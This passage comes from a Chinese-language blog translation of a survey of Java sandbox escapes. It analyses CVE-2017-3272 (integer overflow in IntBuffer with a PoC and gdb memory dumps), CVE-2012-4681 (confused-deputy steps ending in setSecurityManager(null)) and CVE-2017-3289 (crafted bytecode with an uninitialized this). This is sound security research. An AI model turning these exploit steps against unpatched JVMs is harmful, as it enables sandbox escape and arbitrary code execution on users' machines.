第三个约束检查剩余的元素数是否小于或等于要复制的元素数：<br><code>length &lt; lim - pos</code><br>　　为简化起见，我们假设数组的当前索引为0.然后约束变为：<br><code>length &lt; lim</code><br>　　这是一样的<br><code>length &lt; dst.length</code><br>　　这些约束的解决方案是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dst.length = 1209098507</span><br><span class="line">offset     = 1073741764</span><br><span class="line">length     =          2</span><br></pre></td></tr></table></figure><p>　　使用此解决方案，所有约束都得到满足，并且由于存在整数溢出，我们可以在负指数-240（1073741764 &lt;&lt; 2）处读取8个字节（2 * 4）。我们现在有一个read原语来读取dst数组之前的字节。在get（）方法上使用相同的技术，我们得到一个在dst数组之前写入字节的原语。<br>　　我们可以通过编写一个简单的PoC来检查我们的分析是否正确，并在易受攻击的JVM版本（例如Java 1.8 update 60）上执行它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>:  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:</span><br><span class="line"> <span class="number">3</span>:    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> <span class="number">4</span>:      <span class="keyword">int</span>[] dst = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1209098507</span>];</span><br><span class="line"> <span class="number">5</span>:</span><br><span class="line"> <span class="number">6</span>:      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dst.length; i++) &#123;</span><br><span class="line"> <span class="number">7</span>:        dst[i] = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line"> <span class="number">8</span>:      &#125;</span><br><span class="line"> <span class="number">9</span>:</span><br><span class="line"><span class="number">10</span>:      <span class="keyword">int</span> bytes = <span class="number">400</span>;</span><br><span class="line"><span class="number">11</span>:      ByteBuffer bb = ByteBuffer.allocateDirect(bytes);</span><br><span class="line"><span class="number">12</span>:      IntBuffer ib = bb.asIntBuffer();</span><br><span class="line"><span class="number">13</span>:</span><br><span class="line"><span class="number">14</span>:      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ib.limit(); i++) &#123;</span><br><span class="line"><span class="number">15</span>:        ib.put(i, <span class="number">0xBBBBBBBB</span>);</span><br><span class="line"><span class="number">16</span>:      &#125;</span><br><span class="line"><span class="number">17</span>:</span><br><span class="line"><span class="number">18</span>:      <span class="keyword">int</span> offset = <span class="number">1073741764</span>; <span class="comment">// offset &lt;&lt; 2 = -240</span></span><br><span class="line"><span class="number">19</span>:      <span class="keyword">int</span> length = <span class="number">2</span>;</span><br><span class="line"><span class="number">20</span>:</span><br><span class="line"><span class="number">21</span>:      ib.get(dst, offset, length); <span class="comment">// breakpoint here</span></span><br><span class="line"><span class="number">22</span>:    &#125;</span><br><span class="line"><span class="number">23</span>:</span><br><span class="line"><span class="number">24</span>:  &#125;</span><br></pre></td></tr></table></figure><p>　　此代码创建一个大小为1209098507（第4行）的数组，然后将此数组的所有元素初始化为0xAAAAAAAA（第6-8行）。然后，它创建一个IntBuffer类型的实例ib，并将其内部数组的所有元素（整数）初始化为0xBBBBBBBB（第10-16行）。最后，它调用get（）方法将2个元素从ib的内部数组复制到dst，负偏移为-240（第18-21行）。执行此代码不会导致VM崩溃。而且，我们注意到在调用get之后，没有修改dst数组的元素。这意味着来自ib内部数组的2个元素已被复制到dst之外。让我们通过在第21行设置断点然后在运行JVM的进程上启动gdb来检查这一点。在Java代码中，我们使用sun.misc.Unsafe来计算dst的地址，即0x20000000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -p 1234</span><br><span class="line">[...]</span><br><span class="line">(gdb) x/10x 0x200000000</span><br><span class="line">0x200000000:	0x00000001	0x00000000	0x3f5c025e	0x4811610b</span><br><span class="line">0x200000010:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa</span><br><span class="line">0x200000020:	0xaaaaaaaa	0xaaaaaaaa</span><br><span class="line">(gdb) x/10x 0x200000000-240</span><br><span class="line">0x1ffffff10:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x1ffffff20:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x1ffffff30:	0x00000000	0x00000000</span><br></pre></td></tr></table></figure><p>　　使用gdb，我们注意到dst数组的元素已按预期初始化为0xAAAAAAAA。数组不是直接从0xAAAAAAAA开始，而是有一个16字节的头，其中包含数组的大小（0x4811610b = 1209098507）。现在，在数组之前没有任何东西（只有空字节）240个字节。让我们执行get Java方法并使用gdb再次检查内存状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line">Thread 1 &quot;java&quot; received signal SIGINT, Interrupt.</span><br><span class="line">0x00007fb208ac86cd in pthread_join (threadid=140402604672768,</span><br><span class="line">  thread_return=0x7ffec40d4860) at pthread_join.c:90</span><br><span class="line">90	in pthread_join.c</span><br><span class="line">(gdb) x/10x 0x200000000-240</span><br><span class="line">0x1ffffff10:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x1ffffff20:	0xbbbbbbbb	0xbbbbbbbb	0x00000000	0x00000000</span><br><span class="line">0x1ffffff30:	0x00000000	0x00000000</span><br></pre></td></tr></table></figure><p>　　从ib的内部数组到dst的两个元素的副本“工作”：它们在dst的第一个元素之前被复制了240个字节。由于某种原因，程序没有崩溃。查看进程的内存映射表明在0x20000000之前有一个内存区域，即rwx：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pmap 1234</span><br><span class="line">[...]</span><br><span class="line">00000001fc2c0000  62720K rwx--   [ anon ]</span><br><span class="line">0000000200000000 5062656K rwx--   [ anon ]</span><br><span class="line">0000000335000000 11714560K rwx--   [ anon ]</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>　　如下所述，在Java中，类型混淆是沙箱总旁路的同义词。漏洞CVE-2017-3272的想法是使用读写原语来执行类型混淆。我们的目标是在内存中具有以下结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  B[] |0|1|............|k|......|l|</span><br><span class="line">  A[] |0|1|2|....|i|................|m|</span><br><span class="line">int[] |0|..................|j|....|n|</span><br></pre></td></tr></table></figure><p>　　类型为_B_的元素数组，位于<em>IntBuffer</em>对象的内部数组之前的_A_类型的元素数组之前。第一步是使用read原语复制内部整数数组（索引j）内_A_（索引为i）的元素的地址。第二步包括将引用从内部数组（在索引j处）复制到类型为_B_的元素（在索引k处）。完成这两个步骤后，JVM会认为索引k处的元素是_B_类型，但它实际上是_A_类型的元素。<br>　　处理堆的代码很复杂，可以从VM更改为VM（Hotspot，JRockit等），也可以从版本更改为版本。我们已经获得了一个稳定的情况，其中所有三个阵列彼此相邻，用于50个不同版本的JVM，具有以下数组大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = 429496729</span><br><span class="line">m = l</span><br><span class="line">n = 858993458</span><br></pre></td></tr></table></figure><h5 id="3-2-3-讨论"><a href="#3-2-3-讨论" class="headerlink" title="3.2.3 讨论"></a>3.2.3 讨论</h5><p>　　我们已经测试了Java 1.6,1.7和1.8的所有公开可用版本的漏洞。总共51个版本都是易受攻击的：18个版本的1.6（1.6_23到1.6_45），28个版本的1.7（1.7_0到1.7_80）和5个版本的1.8（1.8_05到1.8_60）。<br>　　我们已经讨论过上面的补丁：补丁代码现在首先在执行移位操作之前将32位整数转换为长整数。这有效地防止了整数溢出。</p><h3 id="4-Java级漏洞"><a href="#4-Java级漏洞" class="headerlink" title="4 Java级漏洞"></a>4 Java级漏洞</h3><h4 id="4-1-混淆代理"><a href="#4-1-混淆代理" class="headerlink" title="4.1 混淆代理"></a>4.1 混淆代理</h4><h5 id="4-1-1-背景"><a href="#4-1-1-背景" class="headerlink" title="4.1.1 背景"></a>4.1.1 背景</h5><p>　　混淆代理攻击是Java平台上非常常见的攻击类型。示例攻击是CVE-2012-5088，CVE-2012-5076，CVE-2013-2460以及CVE-2012-4681的攻击，我们将在下面详细介绍。基本思想是利用代码旨在访问私有方法或系统类的字段，以便例如停用安全管理器。但是，漏洞代码不是直接访问所需的类成员，而是代表受信任的系统类执行访问。为此目的滥用系统类的典型方法是利用反射或MethodHandles的不安全使用，即，可信系统类对目标字段执行可由分析员确定的反向读取访问。</p><h5 id="4-1-2-示例：CVE-2012-4681"><a href="#4-1-2-示例：CVE-2012-4681" class="headerlink" title="4.1.2 示例：CVE-2012-4681"></a>4.1.2 示例：CVE-2012-4681</h5><p>　　我们将看看CVE-2012-4681，因为这经常被其他作者称为混淆代理攻击的一个例子。<br>　　作为第一步，我们检索对<em>sun.awt.SunToolkit</em>的访问，这是一个受限制的类，不受信任的代码应该是不可访问的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Expression expr0 = <span class="keyword">new</span> Expression(Class.class, <span class="string">"forName"</span>,</span><br><span class="line"><span class="number">2</span>: 	<span class="keyword">new</span> Object[] &#123;<span class="string">"sun.awt.SunToolkit"</span>&#125;);</span><br><span class="line"><span class="number">3</span>: Class sunToolkit = (Class)expr.execute().getValue();</span><br></pre></td></tr></table></figure><p>　　这已经利用了漏洞。即使我们将Class.forName（）指定为Expression的目标方法，实际上也不会调用此方法。相反，<em>Expression</em>专门为这种情况实现自定义逻辑，它在没有正确检查访问权限的情况下加载类。因此，<em>Expression</em>在这里作为我们混淆代理，为我们加载一个我们不允许加载的类。<br>　　下一步，我们使用SunToolkit.getField（）来访问私有字段Statement.acc。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Expression expr1 = <span class="keyword">new</span> Expression(sunToolkit, <span class="string">"getField"</span>,</span><br><span class="line"><span class="number">2</span>: 	<span class="keyword">new</span> Object[] &#123;Statement.class, <span class="string">"acc"</span>&#125;);</span><br><span class="line"><span class="number">3</span>: Field acc = expr1.execute().getValue();</span><br></pre></td></tr></table></figure><p>　　getField（）是另一个混淆代理，我代表他们获得对系统类的私有字段的反射访问。以下代码段显示getField（）使用doPrivileged（）来获取请求的字段，并将其设置为可访问，以便稍后可以修改其值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class klass,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">2</span>: 	<span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line"> <span class="number">3</span>:  <span class="keyword">return</span> AccessController.doPrivileged(</span><br><span class="line"> <span class="number">4</span>: 	<span class="keyword">new</span> PrivilgedAction&lt;Field&gt;() &#123;</span><br><span class="line"> <span class="number">5</span>: 		<span class="function"><span class="keyword">public</span> Field <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">6</span>: 		...</span><br><span class="line"> <span class="number">7</span>: 			Field field = klass.getDeclaredField(fieldName);</span><br><span class="line"> <span class="number">8</span>: 			...</span><br><span class="line"> <span class="number">9</span>: 			field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="number">10</span>: 			<span class="keyword">return</span> field;</span><br><span class="line"><span class="number">11</span>: 		...</span><br></pre></td></tr></table></figure><p>　　接下来，我们创建一个<em>AccessControlContext</em>，它被分配了所有权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Permissions permissions = <span class="keyword">new</span> Permissions();</span><br><span class="line"><span class="number">2</span>: permissions.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"><span class="number">3</span>: ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(</span><br><span class="line"><span class="number">4</span>: 	<span class="keyword">new</span> URL(<span class="string">"file:///"</span>), <span class="keyword">new</span> Certificate[<span class="number">0</span>]), permissions);</span><br><span class="line"><span class="number">5</span>: AccessControlContext newAcc =</span><br><span class="line"><span class="number">6</span>: 	AccessControlContext(<span class="keyword">new</span> ProtectionDomain[] &#123;pd&#125;);</span><br></pre></td></tr></table></figure><p>　　<em>Statement</em>对象可以表示任意方法调用。创建<em>Statement</em>实例时，它会将当前安全上下文存储在Statement.acc中。调用Statement.execute（）时，它将执行它在最初存储在Statement.acc中的安全上下文中表示的调用，以确保它使用与直接调用它相同的权限调用该方法。<br>　　接下来，我们创建一个表示调用System.setSecurityManager（null）的<em>Statement</em>，并使用具有所有权限的新<em>AccessControlContext</em>覆盖存储在Statement.acc中的<em>AccessControlContext</em>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Statement stmt = <span class="keyword">new</span> Statement(System.class, <span class="string">"setSecurityManager"</span>,</span><br><span class="line"><span class="number">2</span>: 	<span class="keyword">new</span> Object[<span class="number">1</span>]);</span><br><span class="line"><span class="number">3</span>: acc.set(stmt, newAcc)</span><br></pre></td></tr></table></figure><p>　　最后，我们调用stmt.execute（）来实际执行对setSecurityManager（）的调用。此调用将成功，因为我们已将stmt.acc中的安全上下文替换为已分配了所有权限的安全上下文。</p><h5 id="4-1-3-讨论"><a href="#4-1-3-讨论" class="headerlink" title="4.1.3 讨论"></a>4.1.3 讨论</h5><p>　　混乱的代理攻击问题自然源于Java平台安全的核心概念。沙箱的一个关键机制是基于堆栈的访问控制，其在尝试敏感操作时检查调用堆栈，从而检测例如从不可信代码到敏感类成员的直接访问。但是，在许多情况下，此堆栈检查会在检查当前堆栈上的所有调用方是否具有适当权限之前终止。发生这种情况时有两种常见情况。在第一种情况下，堆栈上的一个调用者调用doPrivileged（）来显式声明所需的操作被认为是安全的，即使从非特权代码调用也是如此。而doPrivileged（）通常是一种明智的机制，在未采取所有预防措施以确保特定操作安全的情况下，它也可能被错误地使用。在第二种情况下，系统类中的方法将仅手动检查直接调用方的属性，并跳过JVM的访问控制机制，该机制还将检查堆栈上的其他调用方。在这两种情况下，分析人员只需代表系统类执行某些敏感操作，就可以从不完整的堆栈遍历中获益。</p><h4 id="4-2-未初始化的实例"><a href="#4-2-未初始化的实例" class="headerlink" title="4.2 未初始化的实例"></a>4.2 未初始化的实例</h4><h5 id="4-2-1-背景"><a href="#4-2-1-背景" class="headerlink" title="4.2.1 背景"></a>4.2.1 背景</h5><p>　　Java对象初始化中的关键步骤是调用相应类型的构造函数。构造函数包含变量初始化的必要代码，但也可能包含安全性检查。因此，对于平台的安全性和稳定性来说，强制在对象初始化完成之前实际调用构造函数并且其他代码调用该类型的方法是很重要的。<br>　　执行构造函数调用由字节码验证器负责，它在加载期间检查所有类以确保其有效性。这还包括，例如，检查跳转是否落在有效指令上而不是在指令的中间，并检查控制流是否以返回指令结束。此外，它还检查指令是否对有效类型进行操作，这是防止类型混淆攻击所必需的，我们在第3.1.1节中介绍了这些类型。<br>　　从历史上看，为了检查类型有效性，JVM依靠数据流分析来计算修复点。该分析可能需要在相同路径上执行多次传递。由于这是耗时的，并且可能使类加载过程变慢，因此已经开发了一种新方法来在线性时间中执行类型检查，其中每个路径仅被检查一次。为此，沿字节码添加了称为堆栈映射帧的元信息。简而言之，堆栈映射框描述了每个分支目标的可能类型。堆栈映射帧存储在称为堆栈映射表的结构中。<br>　　当分析人员能够创建一个实例，在该实例上不执行对<init>（*）的调用，对象的构造函数或超类的构造函数的操作时，会出现未初始化的实例漏洞。此漏洞直接违反了虚拟机的规范。对JVM安全性的影响是，对于未初始化的实例漏洞，分析人员可以实例化他不应该访问的对象，并且可以访问他不应该访问的属性和方法。这可能会导致沙箱逃逸。</init></p><h5 id="4-2-2-示例：CVE-2017-3289"><a href="#4-2-2-示例：CVE-2017-3289" class="headerlink" title="4.2.2 示例：CVE-2017-3289"></a>4.2.2 示例：CVE-2017-3289</h5><p>　　CVE的描述表明“此漏洞的成功攻击可能导致Java SE，Java SE Embedded的接管”。至于CVE-2017-3272，这意味着可能利用漏洞逃脱Java沙箱。<br>　　Redhat的bugzilla表示“在OpenJDK的Hotspot组件中发现了与不正确的异常堆栈帧处理有关的不安全的类构造缺陷。不受信任的Java应用程序或applet可能会利用这个漏洞绕过Java沙箱限制。”。这告诉分析师：（1）漏洞在于C / C ++代码（Hotspot是Java VM的名称），以及（2）漏洞与非法类构造和异常堆栈帧有关。信息（2）<br>表示该漏洞可能在C / C ++代码中检查字节码的有效性。该页面还链接到此漏洞的OpenJDK补丁。<br>　　OpenJDK的修补程序“8167104：修复漏洞的其他类构建改进”可在线获取。修补了五个C ++文件：“classfile / verifier.cpp”，负责验证类文件结构和有效性的类，“classfile / stackMapTable。{cpp，hpp}”，处理堆栈映射表的文件，以及“classfile / stackMapFrame。{cpp，hpp}”，表示堆栈映射帧的文件。<br>　　通过查看diff，我们发现已经删除了函数StackMapFrame :: has_flag_match_exception（），并且通过删除对has_flag_match_exception（）的调用来更新我们将称为C1的条件。此外，方法match_stackmap（）和is_assignable_to（）现在只有一个参数：“bool handler”已被删除。如果验证程序当前正在检查异常处理程序，则此参数“handler”设置为“true”。条件C1如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">-  bool match_flags = (_flags | target-&gt;flags()) == target-&gt;flags();</span><br><span class="line">-  if (match_flags || is_exception_handler &amp;&amp;</span><br><span class="line">         has_flag_match_exception(target)) &#123;</span><br><span class="line">+  if ((_flags | target-&gt;flags()) == target-&gt;flags()) &#123;</span><br><span class="line">     return true;</span><br><span class="line">   &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>　　这个条件在函数is_assignable_to（）中，它检查当前堆栈映射帧是否可分配给目标堆栈映射帧，作为参数传递给函数。在补丁之前，返回“true”的条件是“match_flags || is_exception_handler &amp;&amp; has_flag_match_exception（target）”。在英语中，这意味着当前堆栈映射帧和目标堆栈映射帧的标志相同或者当前指令在异常处理程序中，并且函数“has_flag_match_exception”返回“true”。注意，只有一种标志叫做“UNINITIALIZED_THIS”（又名FLAG_THIS_UNINIT）。如果此标志为true，则表示“this”引用的对象未初始化，即尚未调用其构造函数。<br>　　在补丁之后，条件变为“match_flags”。这意味着，在易受攻击的版本中，可能有一种方法来构造“match_flags”为假的字节码（即“this”在当前帧中具有未初始化的标志但在目标帧中没有，但是“ is_exception_handler“是”true“（当前指令在异常处理程序中）并且”has_flag_match_exception（target）“返回”true“。但是这个函数何时返回“true”？<br>　　函数has_flag_match_exception（）在以下列表中表示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: ....</span><br><span class="line"> <span class="number">2</span>: bool StackMapFrame::has_flag_match_exception(</span><br><span class="line"> <span class="number">3</span>:     <span class="keyword">const</span> StackMapFrame* target) <span class="keyword">const</span> &#123;</span><br><span class="line"> <span class="number">4</span>:</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">assert</span>(max_locals() == target-&gt;max_locals() &amp;&amp;</span><br><span class="line"> <span class="number">6</span>:          stack_size() == target-&gt;stack_size(),</span><br><span class="line"> <span class="number">7</span>:                <span class="string">"StackMap sizes must match"</span>);</span><br><span class="line"> <span class="number">8</span>:</span><br><span class="line"> <span class="number">9</span>:   VerificationType top = VerificationType::top_type();</span><br><span class="line"><span class="number">10</span>:   VerificationType this_type = verifier()-&gt;current_type();</span><br><span class="line"><span class="number">11</span>:</span><br><span class="line"><span class="number">12</span>:   <span class="keyword">if</span> (!flag_this_uninit() || target-&gt;flags() != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">13</span>:     <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">14</span>:   &#125;</span><br><span class="line"><span class="number">15</span>:</span><br><span class="line"><span class="number">16</span>:   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; target-&gt;locals_size(); ++i) &#123;</span><br><span class="line"><span class="number">17</span>:     <span class="keyword">if</span> (locals()[i] == this_type &amp;&amp; target-&gt;locals()[i] != top) &#123;</span><br><span class="line"><span class="number">18</span>:       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">19</span>:     &#125;</span><br><span class="line"><span class="number">20</span>:   &#125;</span><br><span class="line"><span class="number">21</span>:</span><br><span class="line"><span class="number">22</span>:   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; target-&gt;stack_size(); ++i) &#123;</span><br><span class="line"><span class="number">23</span>:     <span class="keyword">if</span> (stack()[i] == this_type &amp;&amp; target-&gt;stack()[i] != top) &#123;</span><br><span class="line"><span class="number">24</span>:       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">25</span>:     &#125;</span><br><span class="line"><span class="number">26</span>:   &#125;</span><br><span class="line"><span class="number">27</span>:</span><br><span class="line"><span class="number">28</span>:   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="number">29</span>: &#125;</span><br><span class="line"><span class="number">30</span>: ....</span><br></pre></td></tr></table></figure><p>　　为了使此函数返回“true”，必须通过以下所有条件：（1）当前帧和目标帧的最大局部变量数和堆栈的最大大小必须相同（第5-7行））; （2）当前帧必须将“UNINIT”标志设置为“true”（第12-14行）; （3）目标框架中没有使用未初始化的对象（第16-26行）。<br>　　以下清单说明了满足以下三个条件的字节码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;()</span><br><span class="line">0: new           // class java/lang/Throwable</span><br><span class="line">1: dup</span><br><span class="line">2: invokespecial // Method java/lang/Throwable.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">3: athrow</span><br><span class="line">4: new           // class java/lang/RuntimeException</span><br><span class="line">5: dup</span><br><span class="line">6: invokespecial // Method java/lang/RuntimeException.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">7: athrow</span><br><span class="line">8: return</span><br><span class="line">Exception table:</span><br><span class="line"> from    to  target type</span><br><span class="line">    0    4    8   Class java/lang/Throwable</span><br><span class="line">    StackMapTable: number_of_entries = 2</span><br><span class="line">      frame at instruction 3</span><br><span class="line">        local = [UNINITIALIZED_THIS]</span><br><span class="line">        stack = [ class java/lang/Throwable ]</span><br><span class="line">      frame at instruction 8</span><br><span class="line">        locals = [TOP]</span><br><span class="line">        stack = [ class java/lang/Throwable ]</span><br></pre></td></tr></table></figure><p>　　最大本地数和最大堆栈大小可以设置为2以满足第一个条件。当前帧在第3行将“UNINITIALIZED_THIS”设置为true以满足第二个条件。最后，为了满足第三个条件，未初始化的局部因素不用于“athrow”指令的目标（第8行），因为本地的第一个元素被初始化为“TOP”。<br>　　请注意，代码位于try / catch块中，以便在函数is_assignable_to（）中将“is_exception_handler”设置为“true”。此外，请注意字节码在构造函数中（字节码中的<init>（））。这是必须的，以便将标志“UNINITIALIZED_THIS”设置为true。<br>　　我们现在知道分析师能够制作返回其自身未初始化对象的字节码。乍一看，可能很难看出分析师如何使用这样的对象。但是，仔细观察可以看出，这样一个被操作的类可以实现为系统类的子类，可以在不调用超类的构造函数super。<init>（）的情况下进行初始化。这可用于实例化公共系统类，否则这些类不能由不受信任的代码实例化，因为它们的构造函数是私有的，或包含权限检查。下一步是找到为分析师提供“有趣”功能的类。目的是将所有功能组合在一起，以便能够在沙箱环境中执行任意代码，从而绕过沙箱。然而，找到有用的类本身就是一项复杂的任务。具体而言，我们面临着以下挑战。</init></init></p><ul><li><p>挑战1：在哪里寻找帮助代码<br>JRE附带了许多包含JCL（Java类库）类的jar文件。这些类作为<em>trusted</em> classes加载，并且可以在构造漏洞利用时使用。不幸的是对于分析师来说，但幸运的是，对于Java用户来说，越来越多的类被标记为“受限制”，这意味着<em>untrusted</em>代码无法直接实例化它们。限制包的数量从1.6.0_01中的一个变为1.8.0_121中的47。这意味着分析师在构建漏洞利用时无法直接使用的代码百分比从1.6.0_01中的20％变为1.8.0_121中的54％。</p></li><li><p>挑战2：字段可能未初始化<br>如果没有适当的权限，通常无法实例化新的类加载器。在构造函数中检查<em>ClassLoader</em>类的权限，初看起来似乎是一个有趣的目标。由于CVE-2017-3289的漏洞，确实可以在没有权限的情况下实例化新的类加载器，因为构造函数代码 - 以及权限检查 - 将不会被执行。但是，由于绕过了构造函数，因此使用默认值初始化字段（例如，对于整数为零，对于引用为null）。这是有问题的，因为通常允许定义具有所有特权的新类的有趣方法将失败，因为代码将尝试取消引用尚未正确初始化的字段。在手动检查之后，似乎很难绕过字段解除引用，因为所有路径都通过取消引用非初始化字段的指令。利用<em>ClassLoader</em>似乎是一个死胡同。当使用CVE-2017-3289的漏洞时，非初始化字段是一个主要挑战：除了要求目标类是公共的，非最终的和非限制的，其感兴趣的方法也不应该执行方法取消引用未初始化的字段。</p></li></ul><p>　　我们还没有找到Java版本1.8.0更新112的有用帮助代码。为了说明CVE-2017-3289的漏洞如何工作，我们将展示利用0422和0431的漏洞的替代帮助代码。这两个漏洞依赖于<em>MBeanInstantiator</em>，一个类定义了可以加载任意类的方法findClass（）。类<em>MBeanInstantiator</em>只有私有构造函数，因此无法进行直接实例化。最初，这些漏洞使用<em>JmxMBeanServer</em>来创建<em>MBeanInstantiator</em>的实例。我们将展示分析师可以直接子类化<em>MBeanInstantiator</em>并使用漏洞3289来获取它的实例。<br>　　用于实例化<em>MBeanInstantiator</em>的原始帮助程序代码依赖于<em>JmxMBeanServer</em>，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: JmxMBeanServerBuilder serverBuilder = <span class="keyword">new</span> JmxMBeanServerBuilder();</span><br><span class="line"><span class="number">2</span>: JmxMBeanServer server =</span><br><span class="line"><span class="number">3</span>:      (JmxMBeanServer) serverBuilder.newMBeanServer(<span class="string">""</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"><span class="number">4</span>: MBeanInstantiator instantiator = server.getMBeanInstantiator();</span><br></pre></td></tr></table></figure><p>　　